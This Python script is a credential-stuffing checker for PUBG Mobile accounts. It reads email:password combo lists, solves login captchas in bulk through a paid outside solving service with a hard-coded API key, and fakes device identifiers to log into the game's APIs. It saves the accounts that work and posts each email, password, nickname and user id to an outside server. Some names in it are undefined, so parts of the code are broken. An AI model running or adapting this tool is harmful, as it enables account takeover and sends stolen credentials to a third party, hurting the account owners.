import requests
import hashlib
import time
from colorama import Fore
import uuid
import os
import random
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode
import json
import threading
from requests.adapters import HTTPAdapter
from urllib3.util import Retry
import sys

from datetime import datetime

TARGET_URL = "https://apexai.42web.io/captcha/apex.php"

def Session():
    session = requests.Session()
    retry = Retry(connect=5, backoff_factor=1)
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session


class Api_GXP:
    def __init__(self):
        self.url = "http://api.sctg.xyz"
        self.key = "V3Xirj243IBB7zqtv3LLD4PBn54faXZy"
        self.max_wait = 300
        self.sleep = 1

    def in_api(self, data):
        session = Session()
        params = {"key": self.key}
        for key in data:
            params[key] = data[key]
        return session.get(self.url + '/in.php', params=params, verify=False, timeout=15)

    def res_api(self, api_id):
        session = Session()
        params = {"key": self.key, "id": api_id, "action": "get"}
        return session.get(self.url + '/res.php', params=params, verify=False, timeout=15)

    def get_balance(self):
        session = Session()
        params = {"key": self.key, "action": "getbalance"}
        return session.get(self.url + '/res.php', params=params, verify=False, timeout=15).text

    def run(self, data):
        get_in = self.in_api(data)
        if get_in:
            if "|" in get_in.text:
                api_id = get_in.text.split("|")[1]
            else:
                return get_in.text
        else:
            return "ERROR_CAPTCHA_UNSOLVABLE"
        for i in range(self.max_wait // self.sleep):
            time.sleep(self.sleep)
            get_res = self.res_api(api_id)
            if get_res:
                answer = get_res.text
                if 'CAPCHA_NOT_READY' in answer:
                    continue
                elif "|" in answer:
                    return answer.split("|")[1]
                else:
                    return answer


captcha_tokens_list = []

stop_work = False
calisan = 0
calismayan = 0
kullanilantoken = 0

r = requests.session()
secret_key = "3ec8cd69d71b7922e2a17445840866b26d86e283"

head = {
    "Content-Type": "application/json; charset=utf-8",
    "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Host": "igame.msdkpass.com",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip"
}

user_agent_list = [
    "Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv",
    "Linux; U; Android 5.1.1; SM-G973N Build/PPR1.910397.817",
    "Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv",
    "Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv",
    "Linux; Android 9; SM-G973U Build/PPR1.180610.011",
    "Linux; Android 8.0.0; SM-G960F Build/R16NW",
    "Linux; Android 7.0; SM-G892A Build/NRD90M; wv",
    "Linux; Android 7.0; SM-G930VC Build/NRD90M; wv",
    "Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv",
    "Linux; Android 6.0.1; SM-G920V Build/MMB29K",
    "Linux; Android 5.1.1; SM-G928X Build/LMY47X"
]


def generate_valid_key(url):
    url_params = parse_qs(urlparse(url).query)
    sorted_params = sorted(url_params.items())
    s_key = ''.join([''.join(param) for key, value in sorted_params for param in value])
    s_key += secret_key
    return hashlib.md5(s_key.encode()).hexdigest()


def md5(text):
    return hashlib.md5(bytes(text, encoding='utf-8')).hexdigest()


def check(email, sifre, ticket, randstr):
    try:
        global kullanilantoken, calismayan, calisan
        password = md5(sifre)
        md5url = md5(
            f"/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1{{\"account\":\"{email}\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\"{password}\",\"qcaptcha\":{{\"appid\":\"2033864629\",\"ret\":0,\"ticket\":\"{ticket}\",\"randstr\":\"{randstr}\"}}}}{secret_key}")
        time.sleep(0.5)
        istek = r.get(
            f"https://igame.msdkpass.com/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1&sig={md5url}",
            data=f"{{\"account\":\"{email}\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\"{password}\",\"qcaptcha\":{{\"appid\":\"2033864629\",\"ret\":0,\"ticket\":\"{ticket}\",\"randstr\":\"{randstr}\"}}}}",
            headers=head)
        istektext = istek.text
        istekjson = istek.json()

        loginToken = istekjson.get("token")
        loginUid = istekjson.get("uid")
        headers = {"User-Agent": f"Dalvik/2.1.0 ({random.choice(user_agent_list)})", "Connection": "Keep-Alive",
                   "Accept-Encoding": "gzip, deflate, br"}

        did = str(uuid.uuid4())
        devices = ["G011A", "SM-S906N", "SM-G996U", "SM-G980F", "SM-G973U", "SM-G960F", "SM-G892A", "SM-G930VC",
                   "SM-G935S", "SM-G928X", "J8110", "G8231", "E6653"]
        dinfo = f"1|28602|{random.choice(devices)}|tr|2.6.0|{int(datetime.now().timestamp())}|1.5|1280*730|google"
        gid = str(uuid.uuid4().hex)
        sValidKey = generate_valid_key(
            f"https://ig-us-sdkapi.igamecj.com/v1.0/user/login?did={did}&dinfo={dinfo}&iChannel=42&iGameId=1320&iPlatform=2&sGuestId={gid}&sOriginalId={gid}&sRefer=&token={loginToken}&uid={loginUid}")
        getuserinfoUrl = f"https://ig-us-sdkapi.igamecj.com/v1.0/user/login?did={did}&dinfo={dinfo}&iChannel=42&iGameId=1320&iPlatform=2&sGuestId={gid}&sOriginalId={gid}&sRefer=&sValidKey={sValidKey}&token={loginToken}&uid={loginUid}"

        istek = requests.get(getuserinfoUrl, headers=headers).json()

        oid = istek.get("iOpenid")
        token = istek.get("sInnerToken")
        gid = istek.get("iGameId")
        lci = istek.get("iChannel")

        data = {
            "login_info": {
                "open_id": f"{oid}",
                "token": f"{token}",
                "game_id": gid,
                "login_channel_id": f"{lci}",
                "email": f"{email}"
            }
        }

        response = requests.post('https://esports.pubgmobile.com/tournaments/api/LoginByItop', headers=headers,
                                 json=data).json()

        try:
            nick = response["user_info"]["nick"]
            userid = response["user_info"]["role_id"]
        except Exception as e:
            print("Hata:", str(e))
            nick = "Yok"
            userid = "Yok"

        if nick != "Yok" and userid != "Yok":
            print(Fore.GREEN + f"[+]Success {email}:{sifre}")
            with open('success.txt', 'a') as file:
                file.write(f"{email}|{sifre}|{nick}|{userid}\n")
        data = {
            "userid": userid,
            "nick": nick,
            "email": email,
            "pass": sifre
        }
        try:
            response = requests.post(TARGET_URL, json=data, headers=HEADERS)
            calisan += 1
        except Exception as e:
            if '"verify captcha fail!"' in str(e):
                with open('captcha_fail.txt', 'a') as file:
                    file.write(email + ":" + sifre + '\n')
                print(Fore.RED + f"captcha başarısız")

            elif nick == "Yok" and userid == "Yok":
                with open('fail.txt', 'a') as file:
                    file.write(email + ":" + sifre + '\n')
                print(Fore.RED + f"[-]Fail {email}:{sifre}")
                calismayan += 1

        os.system(f"title APEX Pubgm Checker Success - {calisan} Fail {calismayan}")

    except Exception as e:
        print("Thread " + str(thread_id), " Error: ", str(e))


def get_tokens():
    global captcha_tokens_list
    tokens = []

    while True:
        try:
            now_time = time.time()
            for a in captcha_tokens_list.copy():
                now_token = captcha_tokens_list.pop(0)
                if now_time - now_token["time_solve"] > 150:
                    continue
                tokens.append((now_token["ticket"], now_token["rnd"]))
                break
        except Exception as e:
            print(f"Error Take Token: {str(e)}")
        if len(tokens) != 0:
            break
        time.sleep(0.5)
    return tokens


def combosec(threads_check_accs):
    global kullanilantoken, calisan, calismayan

    threads = []
    f = 'combo_list.txt'
    try:
        with open(f, 'r', encoding='latin1') as file:  # UTF-8 yerine latin1 kodlamasını kullanın
            for x in file.read().splitlines():
                x = x.strip()
                email, pss = x.split(":")[0], x.split(":")[1]
                while True:
                    tmp = []
                    for a in threads:
                        if a.is_alive():
                            tmp.append(a)
                    threads = tmp
                    if len(threads) < threads_check_accs:
                        break
                tokens = get_tokens()
                if tokens:
                    tick, randstr = tokens[0]
                    thread_check = threading.Thread(target=check, args=(email, pss, tick, randstr,))
                    thread_check.start()
                    threads.append(_check)
                else:
                    print("Token bulunamadı!")
                    break
    except FileNotFoundError:
        print(f"{f} dosyası bulunamadı!")

    print(Fore.BLACK + f"Tüm hesaplar kontrol edildi. Çalışan: {calisan}, Çalışmayan: {calismayan}")
    exit()


def while_solve_captcha(data, thread_id):
    global captcha_tokens_list
    global stop_work
    while True:
        try:
            if stop_work:
                break
            api = Api_GXP()
            tcaptcha = api.run(data)
            if tcaptcha and "ERROR_" not in tcaptcha and len(tcaptcha) > 100:
                tcaptcha_inf = json.loads(tcaptcha)
                if "ticket" in tcaptcha_inf and len(tcaptcha_inf['ticket']) > 10 and "randstr" in tcaptcha_inf and len(tcaptcha_inf['randstr']) > 2:
                    token_inf = {
                        "time_solve": time.time(),
                        "ticket": tcaptcha_inf["ticket"],
                        "rnd": tcaptcha_inf["randstr"]
                    }
                    captcha_tokens_list.append(token_inf)
                    #print(f"Thread {str(thread_id)}: ticket:{str(tcaptcha_inf['ticket'])}:rnd:{str(tcaptcha_inf['randstr'])}")
                else:
                    pass
                    #print(f"Thread {str(thread_id)}: Hata: {str(tcaptcha)}")
            else:
                pass
                #print(f"Thread {str(thread_id)}: Hata: {str(tcaptcha)}")
        except Exception as e:
            print("Thread " + str(thread_id), " Error: ", str(e))


if __name__ == "__main__":
    threads_solver_captcha = 50
    threads_check_accs = 15

    for i in range(threads_solver_captcha):
        data = {
            "method": "tcaptcha",
            "pageurl": "https://apexai.42web.io/verify"
        }
        threading.Thread(target=while_solve_captcha, args=(data, i+1)).start()

    # while True:
    #     print(get_tokens())
    combosec(threads_check_accs)
    stop_work = True